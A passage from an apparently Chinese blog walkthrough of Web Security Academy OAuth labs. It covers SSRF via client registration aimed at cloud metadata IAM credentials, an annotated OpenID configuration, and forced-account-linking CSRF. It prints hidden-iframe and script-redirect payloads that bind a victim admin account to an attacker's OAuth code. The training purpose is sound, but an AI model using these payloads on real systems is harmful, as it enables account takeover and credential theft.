+<p>实例标识：实例ID、主机名、公网&#x2F;内网IP等 → 攻击者眼中的价值：确认目标实例身份，辅助后续攻击<br>网络配置：安全组规则、子网信息、VPC信息等 → 攻击者眼中的价值：了解目标网络架构，寻找横向移动路径<br>IAM角色凭证 (关键)：临时访问密钥 (AccessKeyId, SecretAccessKey) → 攻击者眼中的价值：可直接接管云服务控制台权限，是核心目标<br>用户自定义数据：启动脚本、配置文件、密钥等 → 攻击者眼中的价值：脚本中常包含明文密码或源码，可直接利用<br>其他系统信息：可用区、镜像ID、实例类型等 → 攻击者眼中的价值：了解运行环境，为后续渗透提供情报</p>
+</blockquote>
+</li>
+<li><p>设计初衷</p>
+<blockquote>
+<p>元数据服务的设计初衷是为了简化云上应用的部署和管理。例如，一个应用需要在启动时知道自己的内网IP或获取某个特定的配置，传统做法可能需要配置中心或人工干预，但有了元数据服务，应用只需在启动脚本中执行一条简单的命令（如 curl <a target="_blank" rel="noopener" href="http://169.254.169.254/latest/meta-data/local-ipv4%EF%BC%89%E5%8D%B3%E5%8F%AF%E8%8E%B7%E5%8F%96%EF%BC%8C%E6%9E%81%E5%A4%A7%E5%9C%B0%E6%8F%90%E5%8D%87%E4%BA%86%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B0%B4%E5%B9%B3">http://169.254.169.254/latest/meta-data/local-ipv4）即可获取，极大地提升了自动化水平</a></p>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<p>抓包<br><img src="/images/OAuth_authentication/image_26.png" alt="在这里插入图片描述"><br>可以得到oauth服务的url <code>https://oauth-0a52005a0483731d80ff1511025700ce.oauth-server.net</code><br>尝试以 <code>https://oauth-0a52005a0483731d80ff1511025700ce.oauth-server.net/.well-known/openid-configuration</code>访问</p>
+<p><img src="/images/OAuth_authentication/image_27.png" alt="在这里插入图片描述"></p>
+<p>数据</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="comment">// 【核心端点1】授权端点：用户登录、授权的入口页面，客户端引导用户跳转至此完成身份认证</span></span><br><span class="line">  <span class="attr">&quot;authorization_endpoint&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://oauth-0a52005a0483731d80ff1511025700ce.oauth-server.net/auth&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 是否支持claims参数：false=不支持通过该参数自定义返回的用户声明字段</span></span><br><span class="line">  <span class="attr">&quot;claims_parameter_supported&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 支持返回的用户身份声明（ID Token/UserInfo中可包含的字段）</span></span><br><span class="line">  <span class="attr">&quot;claims_supported&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="comment">// sub：用户唯一标识（OIDC必选字段，不可篡改）</span></span><br><span class="line">    <span class="string">&quot;sub&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// name：用户姓名</span></span><br><span class="line">    <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// email：用户邮箱</span></span><br><span class="line">    <span class="string">&quot;email&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// email_verified：邮箱是否已验证</span></span><br><span class="line">    <span class="string">&quot;email_verified&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// sid：会话ID，用于标识用户的登录会话</span></span><br><span class="line">    <span class="string">&quot;sid&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// auth_time：用户完成身份认证的时间戳</span></span><br><span class="line">    <span class="string">&quot;auth_time&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// iss：签发者（即当前OIDC服务的issuer，和顶层issuer字段一致）</span></span><br><span class="line">    <span class="string">&quot;iss&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 支持的PKCE代码挑战方法：S256=SHA-256加密，用于防止授权码拦截攻击</span></span><br><span class="line">  <span class="attr">&quot;code_challenge_methods_supported&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;S256&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 【核心端点2】会话注销端点：用户退出登录、销毁会话的接口</span></span><br><span class="line">  <span class="attr">&quot;end_session_endpoint&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://oauth-0a52005a0483731d80ff1511025700ce.oauth-server.net/session/end&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 支持的授权类型（Grant Type）</span></span><br><span class="line">  <span class="attr">&quot;grant_types_supported&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="comment">// authorization_code：授权码模式（OIDC最安全、最标准的模式）</span></span><br><span class="line">    <span class="string">&quot;authorization_code&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// refresh_token：刷新令牌模式，用于续期Access Token</span></span><br><span class="line">    <span class="string">&quot;refresh_token&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// ID Token支持的签名算法：用于签发ID Token的加密算法</span></span><br><span class="line">  <span class="attr">&quot;id_token_signing_alg_values_supported&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="comment">// HS256：HMAC-SHA256（对称加密，客户端和服务端共享密钥）</span></span><br><span class="line">    <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// ES256：ECDSA-SHA256（非对称加密，椭圆曲线算法）</span></span><br><span class="line">    <span class="string">&quot;ES256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// EdDSA：Edwards曲线数字签名算法（非对称加密，性能更高）</span></span><br><span class="line">    <span class="string">&quot;EdDSA&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// PS256：RSASSA-PSS-SHA256（非对称加密，RSA签名带填充）</span></span><br><span class="line">    <span class="string">&quot;PS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// RS256：RSASSA-PKCS1-v1_5-SHA256（最常用的非对称加密算法）</span></span><br><span class="line">    <span class="string">&quot;RS256&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 【核心标识】Issuer签发者：OIDC服务的唯一标识符，规范要求必须为HTTPS URL</span></span><br><span class="line">  <span class="attr">&quot;issuer&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://oauth-0a52005a0483731d80ff1511025700ce.oauth-server.net&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 【核心端点3】JWKS公钥端点：用于验证JWT（ID Token/请求对象）签名的公钥集合</span></span><br><span class="line">  <span class="attr">&quot;jwks_uri&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://oauth-0a52005a0483731d80ff1511025700ce.oauth-server.net/jwks&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 【核心端点4】动态客户端注册端点：本题攻击入口，允许任意客户端自动注册获取client_id</span></span><br><span class="line">  <span class="attr">&quot;registration_endpoint&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://oauth-0a52005a0483731d80ff1511025700ce.oauth-server.net/reg&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 支持的响应模式：授权结果返回给客户端的方式</span></span><br><span class="line">  <span class="attr">&quot;response_modes_supported&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="comment">// form_post：通过表单POST返回授权码（安全性最高，避免URL泄露）</span></span><br><span class="line">    <span class="string">&quot;form_post&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// fragment：通过URL片段返回（仅适用于SPA等前端应用）</span></span><br><span class="line">    <span class="string">&quot;fragment&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// query：通过URL查询参数返回（最常用，安全性一般）</span></span><br><span class="line">    <span class="string">&quot;query&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 支持的响应类型：code=授权码（仅支持授权码模式，符合OIDC安全规范）</span></span><br><span class="line">  <span class="attr">&quot;response_types_supported&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;code&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 支持的权限范围（Scope）</span></span><br><span class="line">  <span class="attr">&quot;scopes_supported&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="comment">// openid：OIDC必选范围，用于标识这是OIDC认证请求</span></span><br><span class="line">    <span class="string">&quot;openid&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// offline_access：用于获取Refresh Token，实现无感知续期</span></span><br><span class="line">    <span class="string">&quot;offline_access&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// profile：获取用户基本资料（姓名、头像等）</span></span><br><span class="line">    <span class="string">&quot;profile&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// email：获取用户邮箱信息</span></span><br><span class="line">    <span class="string">&quot;email&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 支持的主题类型：public=公开主题（用户标识对所有客户端一致，标准配置）</span></span><br><span class="line">  <span class="attr">&quot;subject_types_supported&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;public&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 令牌端点的客户端认证方式：客户端向/token端点请求令牌时的身份验证方法</span></span><br><span class="line">  <span class="attr">&quot;token_endpoint_auth_methods_supported&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="comment">// none：无认证（适用于公共客户端，如SPA/移动App）</span></span><br><span class="line">    <span class="string">&quot;none&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// client_secret_basic：通过Basic Auth头传递客户端密钥（最常用）</span></span><br><span class="line">    <span class="string">&quot;client_secret_basic&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// client_secret_jwt：通过JWT传递客户端密钥（对称加密）</span></span><br><span class="line">    <span class="string">&quot;client_secret_jwt&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// client_secret_post：通过POST表单传递客户端密钥</span></span><br><span class="line">    <span class="string">&quot;client_secret_post&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// private_key_jwt：通过客户端私钥签名JWT进行认证（非对称加密，安全性最高）</span></span><br><span class="line">    <span class="string">&quot;private_key_jwt&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 令牌端点认证时支持的签名算法</span></span><br><span class="line">  <span class="attr">&quot;token_endpoint_auth_signing_alg_values_supported&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;PS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;ES256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;EdDSA&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 【核心端点5】令牌端点：交换授权码/刷新令牌，获取Access Token/ID Token的接口</span></span><br><span class="line">  <span class="attr">&quot;token_endpoint&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://oauth-0a52005a0483731d80ff1511025700ce.oauth-server.net/token&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 请求对象（Request Object）支持的签名算法</span></span><br><span class="line">  <span class="attr">&quot;request_object_signing_alg_values_supported&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;PS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;ES256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;EdDSA&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 是否支持request参数：false=不支持通过该参数传递请求对象</span></span><br><span class="line">  <span class="attr">&quot;request_parameter_supported&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 是否支持request_uri参数：true=支持通过URI传递请求对象</span></span><br><span class="line">  <span class="attr">&quot;request_uri_parameter_supported&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 是否要求注册request_uri：true=必须提前注册request_uri，防止钓鱼</span></span><br><span class="line">  <span class="attr">&quot;require_request_uri_registration&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 【核心端点6】用户信息端点：通过Access Token获取用户详细身份信息的接口</span></span><br><span class="line">  <span class="attr">&quot;userinfo_endpoint&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://oauth-0a52005a0483731d80ff1511025700ce.oauth-server.net/me&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 用户信息端点响应的签名算法</span></span><br><span class="line">  <span class="attr">&quot;userinfo_signing_alg_values_supported&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;ES256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;EdDSA&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;PS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;RS256&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 【核心端点7】令牌内省端点：校验令牌有效性、查询令牌权限的接口</span></span><br><span class="line">  <span class="attr">&quot;introspection_endpoint&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://oauth-0a52005a0483731d80ff1511025700ce.oauth-server.net/token/introspection&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 内省端点的客户端认证方式</span></span><br><span class="line">  <span class="attr">&quot;introspection_endpoint_auth_methods_supported&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;none&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;client_secret_basic&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;client_secret_jwt&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;client_secret_post&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;private_key_jwt&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 内省端点认证时支持的签名算法</span></span><br><span class="line">  <span class="attr">&quot;introspection_endpoint_auth_signing_alg_values_supported&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;PS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;ES256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;EdDSA&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 【核心端点8】令牌吊销端点：使Access Token/Refresh Token失效的接口（用于注销）</span></span><br><span class="line">  <span class="attr">&quot;revocation_endpoint&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://oauth-0a52005a0483731d80ff1511025700ce.oauth-server.net/token/revocation&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 吊销端点的客户端认证方式</span></span><br><span class="line">  <span class="attr">&quot;revocation_endpoint_auth_methods_supported&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;none&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;client_secret_basic&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;client_secret_jwt&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;client_secret_post&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;private_key_jwt&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 吊销端点认证时支持的签名算法</span></span><br><span class="line">  <span class="attr">&quot;revocation_endpoint_auth_signing_alg_values_supported&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;PS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;ES256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;EdDSA&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 支持的声明类型：normal=标准声明（默认配置，无特殊处理）</span></span><br><span class="line">  <span class="attr">&quot;claim_types_supported&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;normal&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+<p><code> 注册点：&quot;registration_endpoint&quot;:&quot;https://oauth-0a52005a0483731d80ff1511025700ce.oauth-server.net/reg&quot;</code></p>
+<p>同时，在登录过程中，有两个数据包值得注意<br><img src="/images/OAuth_authentication/image_28.png" alt="在这里插入图片描述"><br>分析<code>绿色箭头</code>所指向数据包的url,发现其是访问oauth服务器，然后是直接返回图片，而不是让客户端重定向获取logo。 那就存在两种可能了：一是客户端之前就上传了logo给oauth（静态注册）；二是oauth访问logo的url然后返回给客户端（动态注册，但是有SSRF风险）</p>
+<p>尝试注册一下<br><img src="/images/OAuth_authentication/image_29.png" alt="在这里插入图片描述"></p>
+<p>获取logo<br><img src="/images/OAuth_authentication/image_30.png" alt="在这里插入图片描述"></p>
+<p>查看记录<br><img src="/images/OAuth_authentication/image_31.png" alt="在这里插入图片描述"><br><code>可以证实存在SSRF漏洞</code></p>
+<p>利用<br><img src="/images/OAuth_authentication/image_32.png" alt="在这里插入图片描述"></p>
+<p>获取log<br><img src="/images/OAuth_authentication/image_33.png" alt="在这里插入图片描述"></p>
+<p>解码提交即可</p>
+<hr>
+<h3 id="0x03-OAuth-账号强制绑定"><a href="#0x03-OAuth-账号强制绑定" class="headerlink" title="0x03.OAuth 账号强制绑定"></a>0x03.OAuth 账号强制绑定</h3><p>本实验支持将社交媒体账号与你的网站账号绑定，以便你后续可以通过 OAuth 方式登录，而无需使用常规的用户名密码。由于客户端应用对 OAuth 流程存在不安全实现，攻击者可利用该功能获取其他用户账号的访问权限。<br>实验目标：通过 CSRF 攻击，将你自己的社交媒体账号强制绑定到博客网站的管理员账号上；随后进入管理员面板，删除用户 carlos。<br>管理员用户会打开你从漏洞利用服务器发送的任意链接，并且其在博客网站上始终保持有效登录会话。<br>测试账号：<code>博客网站账号（本网站账号）</code>：wiener:peter；<code>社交媒体账号</code>：peter.wiener:hotdog</p>
+<p>正常登录后发现可以绑定第三方账号，所以逐步抓包分析<br><img src="/images/OAuth_authentication/image_34.png" alt="在这里插入图片描述"></p>
+<p>抓取绑定流程的数据包<br><img src="/images/OAuth_authentication/image_35.png" alt="在这里插入图片描述"><br>在本地的登录流程中，是没有先第三方oauth认证服务器提交数据进行动态注册，而在绑定第三方账号时，发送的第一个请求就含有注册数据。这说明：这些注册参数是客户端静态注册的，且不针对一某一个特定的用户，而是整个客户端</p>
+<p><img src="/images/OAuth_authentication/image_36.png" alt="在这里插入图片描述"></p>
+<p>正确登录后进行不断重定向跳转，来到授权页面<br><img src="/images/OAuth_authentication/image_37.png" alt="在这里插入图片描述"></p>
+<p>点击授权<br><img src="/images/OAuth_authentication/image_38.png" alt="在这里插入图片描述"></p>
+<p>最后绑定了账号<br><img src="/images/OAuth_authentication/image_39.png" alt="在这里插入图片描述"></p>
+<p>整个流程大概可以分为三部分：</p>
+<ol>
+<li><p>在用户网站登录</p>
+</li>
+<li><p>在认证服务器登录</p>
+</li>
+<li><p>从认证服务器携带<code>code</code>重定向到用户网站，由于用户已经在用户网站登录，该用户与code也就是认证服务器的账户进行绑定</p>
+</li>
+</ol>
+<p>值得注意的是：到第三步仅仅使用<code>一个数据包</code>完成，<code>唯一的参数</code>就是和认证服务器账户相关联的code</p>
+<p>攻击点：如果code相关的<code>认证服务器账户</code>是<code>攻击者的账户</code>，就可以实现将<code>用户账户</code>绑定到<code>攻击者的认证账户</code>，攻击者也就盗取了目标账户。漏洞源于OAuth 授权流程缺少<code>state 参数保护</code>和<code>应用未验证授权码（code）</code>归属</p>
+<p><img src="/images/OAuth_authentication/image_40.png" alt="在这里插入图片描述"></p>
+<table>
+<thead>
+<tr>
+<th>安全属性</th>
+<th>正常安全配置</th>
+<th>靶场漏洞配置</th>
+<th>影响</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>SameSite</code></td>
+<td><code>Strict</code> 或 <code>Lax</code>（严格模式）</td>
+<td>未设置 &#x2F; <code>None</code>（宽松模式）</td>
+<td>跨站请求（iframe&#x2F;恶意链接）会自动携带Cookie</td>
+</tr>
+<tr>
+<td><code>HttpOnly</code></td>
+<td>必须设置（防XSS）</td>
+<td>已设置（不影响CSRF）</td>
+<td>仅保护Cookie不被JS读取，不阻止自动携带</td>
+</tr>
+<tr>
+<td><code>Secure</code></td>
+<td>生产环境必须设置</td>
+<td>靶场可能未设置</td>
+<td>仅限制HTTPS传输，不影响CSRF</td>
+</tr>
+</tbody></table>
+<p>即存在<code>csrf</code>漏洞利用</p>
+<p>因为code是一次性的，所以抓取完后需要drop包<br><img src="/images/OAuth_authentication/image_41.png" alt="在这里插入图片描述"><br>在攻击服务器上构造payload，deliver exploit to victim模拟将恶意链接发送给受害者，受害者点击链接绑定管理员到攻击者的认证服务器账号</p>
+<p><code>隐式攻击payload</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> </span></span><br><span class="line"><span class="tag">	<span class="attr">src</span>=<span class="string">&quot;https://0a7f00950404b95f80043f6d004200b2.web-security-academy.net/oauth-linking?code=EWaXnABFw5QhCRRQoFS3bScX3qNIb-9RA9KF4LOduHT&quot;</span> </span></span><br><span class="line"><span class="tag">	<span class="attr">width</span>=<span class="string">&quot;0&quot;</span> </span></span><br><span class="line"><span class="tag">	<span class="attr">height</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>显示攻击payload（自动跳转）</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;https://0a7f00950404b95f80043f6d004200b2.web-security-academy.net/oauth-linking?code=EWaXnABFw5QhCRRQoFS3bScX3qNIb-9RA9KF4LOduHT&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以查看日志是否生效<br><img src="/images/OAuth_authentication/image_42.png" alt="在这里插入图片描述"></p>
+<p>以第三方账号登录之后就是管理员界面<br><img src="/images/OAuth_authentication/image_43.png" alt="在这里插入图片描述"></p>
+<p>删除账号即可</p>
+<hr>
+<h3 id="0x04-通过-redirect-uri-实现-OAuth-账号劫持"><a href="#0x04-通过-redirect-uri-实现-OAuth-账号劫持" class="headerlink" title="0x04.通过 redirect_uri 实现 OAuth 账号劫持"></a>0x04.通过 redirect_uri 实现 OAuth 账号劫持</h3><p>本实验通过 OAuth 服务为用户提供「社交账号登录」功能。OAuth 服务提供商的一处配置错误，使得攻击者可以窃取其他用户账号对应的授权码（authorization code）。<br>要完成本实验，你需要：窃取与管理员（admin）用户绑定的有效授权码；使用该授权码登录管理员的账号删除用户 carlos<br>管理员用户会打开你从  漏洞利用服务器（Exploit Server） 发送的任何内容，且始终保持与 OAuth 服务的有效登录会话（无需重新输入密码授权）。<br>你可以使用以下凭证登录自己的社交账号：用户名：wiener；密码：peter</p>
